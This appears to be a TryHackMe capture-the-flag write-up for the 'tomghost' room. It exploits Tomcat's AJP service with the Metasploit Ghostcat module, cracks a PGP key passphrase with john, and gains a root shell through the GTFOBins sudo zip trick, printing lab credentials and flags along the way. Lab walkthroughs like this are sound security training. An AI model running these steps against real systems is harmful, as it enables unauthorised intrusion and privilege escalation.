# tomghost
https://tryhackme.com/room/tomghost

export target=10.10.111.174

## Compromise this machine and obtain user.txt
I scanned the machine using nmap:

22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped syn-ack
8009/tcp open  ajp13      syn-ack Apache Jserv (Protocol v1.3)
8080/tcp open  http       syn-ack Apache Tomcat 9.0.30

I ran searchsploit with the query:
`searchsploit tomcat ajp` which let me know that metasploit has an exploit for this called "Ghostcat"

I run the following commmands
```
msfconsole -q
msf6 > search ghostcat
msf6 > use auxiliary/admin/http/tomcat_ghostcat
msf6 > set RHOSTS <target ip>
msf6 > show options

   AJP_PORT  8009              no        The Apache JServ Protocol (AJP) port
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS    <target ip>       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     8080              yes       The Apache Tomcat webserver port (TCP)
   SSL       false             yes       SSL

msf6 > run
```

This gives us a username & password:
`skyfuck:8730281lkjlkjdqlksalks` which we can use for SSH access.

We need to find the user.txt file so I checked the /home directory for other users and there is a user called merlin.
So I check that user's directory and find a file called user.txt which contains the flag:

THM{GhostCat_1s_so_cr4sy}

## Escalate privileges and obtain root.txt
Tried: `sudo -l `
Nothing was available on the skyfuck user.

Tried: `find / -user root -perm -4000 -print 2>/dev/null`
Nothing special here.

Checked files in skyfuck user home directory:
- credential.pgp: PGP Encrypted message?
- tryhackme.asc: PGP Private Key Block

Transfered files to local machine using scp:
`scp skyfuck@<ip>:/home/skyfuck/<file> .`

Tried to import pgp private key from tryhackme.asc - it's password protected.
`gpg --import tryhackme.asc`

Extracted hash using gpg2john:
`gpg2john tryhackme.asc > hash.txt`

Then attempted to crack password:
`john hash.txt --wordlist=<rockyou_utf8>`
Password found: alexandru

imported gpg key with new password and decrypted .pgp file
`gpg --decrypt credential.pgp`

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

Logged into merlin user via SSH.
Tried: `sudo -l`
Found sudo usage for zip: https://gtfobins.github.io/gtfobins/zip/#sudo

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

I then found the flag in /root/root.txt

THM{Z1P_1S_FAKE}
